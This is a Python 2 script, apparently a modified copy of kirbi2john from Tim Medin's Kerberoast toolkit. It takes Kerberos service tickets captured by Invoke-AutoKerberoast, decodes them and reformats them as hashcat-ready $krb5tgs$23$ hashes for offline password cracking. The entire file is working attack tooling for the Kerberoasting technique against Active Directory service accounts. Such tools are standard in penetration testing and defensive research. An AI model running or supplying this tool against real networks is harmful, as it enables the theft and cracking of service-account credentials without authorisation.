# Note: This is a copy of kirbi2john.py with slight modifications to take input from Invoke-Autokerberoast function output and output in a hashcat-compatible format.


# Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets
# from a kirbi file.
# Modification to parse them into the JTR-format by Michael Kramer (SySS GmbH)
# Copyright [2015] [Tim Medin, Michael Kramer]
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License

		

from pyasn1.codec.ber import encoder, decoder
from multiprocessing import JoinableQueue, Manager
import glob, sys, base64 


# This will seperate out the list of all tickets into an array of individual tickets
def parseTickets(allTickets):
	magicString1 = "Base64 encoded Kerberos ticket for "
	magicString2 = ":::do"
	ticketArray = []
	labelArray = []
	failedTicketLabelArray = []

	if ( allTickets[:len(magicString1)] != magicString1 ):
		print "ERROR: Ticket file must start with string \"Base64 encoded Kerberos ticket for\" from Invoke-AutoKerberoast Output."
		exit(1)

	combinedArray = allTickets.split(magicString1)
	combinedArray = combinedArray[1:]

	count = 0
	for i in combinedArray:
		count += 1
		try:
			magicString2Location = i.index(magicString2)
			labelArray.append("ID#"+str(count)+"_"+str(i[:magicString2Location]))
			ticketArray.append(str(i[(magicString2Location+3):]))
		except:
			endOfNameLocation = i.index(":::")
			failedTicketLabelArray.append("ID#"+str(count)+"_"+str(i[:endOfNameLocation]))

	return ticketArray, labelArray, failedTicketLabelArray

# Format base64 encoded ticket into hashcat-ready string.  Label should be describe where the ticket came from, e.g. "MSSQLSvc/SQLBOX.RESTRICTED.TESTLAB.LOCAL:1433"
def formatTicket(ticket, label):
	data = base64.b64decode(ticket)

	manager = Manager()
	enctickets = manager.list()

	if data[0] == '\x76':
		enctickets.append((str(decoder.decode(data)[0][2][0][3][2])))
	elif data[:2] == '6d':
		for ticket in data.strip().split('\n'):
			enctickets.append((str(decoder.decode(ticket.decode('hex'))[0][4][3][2])))

	hashcatTicket = "$krb5tgs$23$*" + str(label) + "*$"+enctickets[0][:16].encode("hex")+"$"+enctickets[0][16:].encode("hex")+"\n"

	return hashcatTicket


def main():
	if len(sys.argv) < 2 or len(sys.argv) > 3:
		print 'USAGE: python ./autoKirbi2hashcat.py <ticketsFile.txt>\n\tNote: Tickets file should be the output of Invoke-AutoKerberoast, starting with \'Base64 encoded Kerberos ticket for...\''
		print 'OPTIONAL USAGE: python ./autoKirbi2hashcat.py <ticketsFile.txt> MASK\n\tNote: placing the word MASK as the third argument will replace the username/SPN caption with numeric values'
		exit(1)

	hashcatTickets = ""
	ticketsFileName = sys.argv[1]
	maskNames = False
	if (len(sys.argv) == 3) and (str(sys.argv[2]).upper() == "MASK"):
		maskNames = True

	ticketsFile = open(ticketsFileName, 'r')
	ticketsFileString = ticketsFile.read().replace('\n','')
	ticketsFileString = ticketsFileString.replace('[+] received output:','')

	ticketArray, labelArray, failedTicketLabelArray = parseTickets(ticketsFileString)

	if (maskNames == True):
		for i in range(len(labelArray)):
			maskedLabel = str(labelArray[i])
			maskedLabelCutOffLoc = maskedLabel.index("_")+1
			labelArray[i] = maskedLabel[:maskedLabelCutOffLoc]
		for i in range(len(failedTicketLabelArray)):
			maskedLabel = str(failedTicketLabelArray[i])
			maskedLabelCutOffLoc = maskedLabel.index("_")+1
			failedTicketLabelArray[i] = maskedLabel[:maskedLabelCutOffLoc]

	for i in range(len(ticketArray)):
		hashcatTickets += formatTicket(ticketArray[i], labelArray[i])

	print hashcatTickets

	if len(failedTicketLabelArray) > 0:
		print "WARNING: unable to convert tickets for: "
		print str(failedTicketLabelArray)


if __name__ == '__main__':
    main()